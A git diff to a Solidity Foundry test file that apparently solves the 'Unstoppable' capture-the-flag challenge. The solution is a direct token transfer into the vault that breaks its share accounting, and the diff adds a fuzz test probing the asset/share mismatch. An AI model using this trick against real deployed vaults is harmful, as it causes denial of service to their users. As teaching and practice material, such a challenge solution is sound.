@@ -56,7 +56,7 @@ contract UnstoppableChallenge is Test {
     /**
      * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
      */
-    function test_assertInitialState() public {
+    function test_assertInitialStateUnstoppable() public {
         // Check initial token balances
         assertEq(token.balanceOf(address(vault)), TOKENS_IN_VAULT);
         assertEq(token.balanceOf(player), INITIAL_PLAYER_TOKEN_BALANCE);
@@ -91,7 +91,22 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
-        
+        token.transfer(address(vault),INITIAL_PLAYER_TOKEN_BALANCE);
+    }
+
+    function test_fuzzTest(uint256 amount) public  {
+        vm.startPrank(player);
+        uint256 amt=bound(amount,1,INITIAL_PLAYER_TOKEN_BALANCE);
+        token.approve(address(vault),amt);
+        vault.mint(amt,player);
+        // uint256 fraction=bound(frac,1,sh);
+        vault.redeem(amt,player,player);
+        uint256 amountBefore=vault.totalAssets();
+        uint256 shares=vault.convertToShares(amountBefore);
+        if(amountBefore!=shares){
+            console.log("the amount for which it succedded is:",amt);
+        }
+        vm.stopPrank();
     }
 
     /**
